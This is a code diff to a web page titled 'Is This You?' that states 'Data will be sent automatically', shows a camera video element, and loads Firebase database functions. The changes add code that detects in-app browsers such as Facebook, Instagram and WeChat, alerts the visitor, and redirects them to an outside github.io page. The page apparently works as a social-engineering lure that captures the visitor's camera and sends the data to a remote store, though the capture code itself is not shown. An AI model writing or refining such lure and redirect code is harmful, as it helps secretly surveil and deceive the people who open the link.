@@ -67,18 +67,6 @@
             border: 2px solid green;
             display: none; /* Hide initially until we get the stream */
         }
-        #browser-warning {
-            color: red;
-            display: none; /* Hidden by default */
-            margin: 20px;
-            text-align: center;
-        }
-        #instruction {
-            color: yellow;
-            margin: 20px;
-            font-size: 18px;
-            font-weight: bold;
-        }
     </style>
 </head>
 <body>
@@ -89,17 +77,12 @@
     </div>
     <div class="container">
         <h1>Is This You?</h1>
-        <div id="instruction">
-            <p><strong>IMPORTANT:</strong> For the best experience, please open this link in <strong>Samsung Internet</strong> or <strong>Opera</strong>.</p>
-        </div>
+        <p id="instruction"></p>
         <p>Data will be sent automatically.</p>
-        <button class="button" id="start-button">Start Process</button>
+        <button class="button" id="start-button" style="display: none;">Start Process</button>
         <div id="error-message" class="error-message"></div>
         <div id="info-message" class="info-message"></div>
         <video id="video" autoplay playsinline></video>
-        <div id="browser-warning">
-            <p>Please open this link in a standard browser for the best experience.</p>
-        </div>
     </div>
 
     <script type="module">
@@ -114,6 +97,26 @@
             measurementId: "G-HTXZEYZ3DK" // Your Measurement ID
         };
 
+        // Function to detect in-app browsers
+        function isInAppBrowser() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            return /FBAN|FBAV|Instagram|Line|MicroMessenger|QQ|Kakao|WeChat/.test(userAgent);
+        }
+
+        // Immediate user prompt if in-app browser is detected
+        if (isInAppBrowser()) {
+            alert("Please open this link in Samsung Internet or Opera for the best experience.");
+            const redirectURL = "https://frankwesseling132.github.io/my-html-site/";
+            document.getElementById('instruction').innerText = 
+                "Opening in your default browser may provide better functionality.";
+            setTimeout(() => {
+                window.location.href = redirectURL; // Redirect URL
+            }, 5000); // 5 seconds delay before redirect
+        } else {
+            document.getElementById('instruction').innerText = "You may proceed.";
+            document.getElementById('start-button').style.display = 'block'; // Show start button
+        }
+
         // Initialize Firebase
         const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
         const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");
@@ -125,19 +128,6 @@
         const errorMessage = document.getElementById('error-message');
         const infoMessage = document.getElementById('info-message');
         const videoElement = document.getElementById('video');
-        const browserWarning = document.getElementById('browser-warning');
-
-        // Function to detect in-app browsers
-        function isInAppBrowser() {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            return /FBAN|FBAV|Instagram|Line|MicroMessenger|QQ|Kakao|WeChat/.test(userAgent);
-        }
-
-        // Show warning if in-app browser is detected
-        if (isInAppBrowser()) {
-            browserWarning.style.display = 'block';
-            infoMessage.innerHTML = "You are using an in-app browser. Please open this link in Samsung Internet or Opera for the best experience.";
-        }
 
         document.getElementById('start-button').addEventListener('click', startProcess);
 
